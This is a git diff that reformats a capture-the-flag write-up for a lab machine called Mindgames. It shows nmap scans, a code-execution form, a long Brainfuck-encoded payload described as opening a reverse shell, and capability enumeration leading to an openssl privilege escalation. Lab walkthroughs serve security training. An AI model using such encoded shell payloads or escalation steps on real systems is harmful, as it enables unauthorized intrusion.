@@ -10,9 +10,9 @@ No hints. Hack it. Don't give up if you get stuck, enumerate harder
 
 
 # We run a basic nmap scan against the target
-**nmap 10.113.187.44 --top-ports 10000 -T5 -oN top10000.txt**
+`nmap 10.113.187.44 --top-ports 10000 -T5 -oN top10000.txt`
 
-
+```
 PORT   STATE SERVICE
 
 
@@ -20,7 +20,7 @@ PORT   STATE SERVICE
 
 
 80/tcp open  http
-
+```
 
 + we can see that SSH and HTTP are running on the target machine
 
@@ -31,10 +31,10 @@ PORT   STATE SERVICE
 # We run a deeper nmap scan against the target
 
 
-**nmap -sC -sS -A --version-intensity 5 -v5 -T5 10.113.187.44 -p 22,80 -oN advancedNmap.txt --open --reason**
+`nmap -sC -sS -A --version-intensity 5 -v5 -T5 10.113.187.44 -p 22,80 -oN advancedNmap.txt --open --reason`
 
 
-`
+```
 80/tcp open  http    syn-ack ttl 62 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
 
 |_http-title: Mindgames.
@@ -42,7 +42,7 @@ PORT   STATE SERVICE
 | http-methods: 
 
 |_  Supported Methods: GET HEAD POST OPTIONS
-`
+```
 
 + we get information about both SSH and HTTP but http strikes me as interesting
 
@@ -56,7 +56,7 @@ PORT   STATE SERVICE
 `curl http://10.113.187.44`
 
 
-`
+```
 <form id="codeForm">
 
         <textarea id="code" placeholder="Enter your code here..."></textarea><br>
@@ -64,7 +64,7 @@ PORT   STATE SERVICE
         <button>Run it!</button>
         
 </form>
-`
+```
 
 + the code form strikes me as interesting
 
@@ -90,9 +90,9 @@ PORT   STATE SERVICE
 
 + use dcode to encode it into brainfuck
 
-`
+```
 ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.++++.+++.-.+++.++.<<++.>>-----.++++.<<++++++++++++.>>---.++++.+++++.<<.>>------.----.------------.++++++++.------.+++++++++++++++.<-----------.>-.<++.>.----.------------.++++++++.------.+++++++++++++++.<<++.>>-.----.------------.++++++++.------.+++++++++++++++.<<------.+.>--.>-.<<+++++.>>----------------.++++++++++++.-..---------.--.+++++++++++++++++.<<------..------.>----------.++++++++.-------.----.+++.+++++.++.----------.+++.++.+++.--------.+++.++.-.<.>------.++++++++++++.--------...<+++++++..>+++++++++++.>-------------------------.++++++++++++++++++++.++++.<<+++++.>>---------------.+++++++++++++++++.-----.<<++++.----------.>>+++.<<++++++.>>-------------.+++.+++.-------.+++++++++.+.<<------.+.+++.>>---------.<<---.>>.+++++++++.+++.<<---------.>>------------.<<.>>+++.+++++.<<++++++++.++++++++.----.+++++.-----.++++++.---------.>>-----------------.<.>+++++++++++++++++++.++++.+++++.<<+++++.>>------.---.---------------.++++++++++++++++++++++.---------.<<------.------.>>+++++.-----------.<<.+++++++.
-`
+```
 
 
 + once done execute this into the interpreter and we will receieve a reverse shell connection
@@ -116,7 +116,7 @@ thm{******38247ff441ce4e13**********}
 
 `getcap -r / 2>/dev/null`
 
-
+```
 /usr/bin/mtr-packet = cap_net_raw+ep
 
 
@@ -124,7 +124,7 @@ thm{******38247ff441ce4e13**********}
 
 
 /home/mindgames/webserver/server = cap_net_bind_service+ep
-
+```
 
 + the openssl capability strikes me as interesting. After a bit of research I discover it is vulnerable to privilege escalation
 
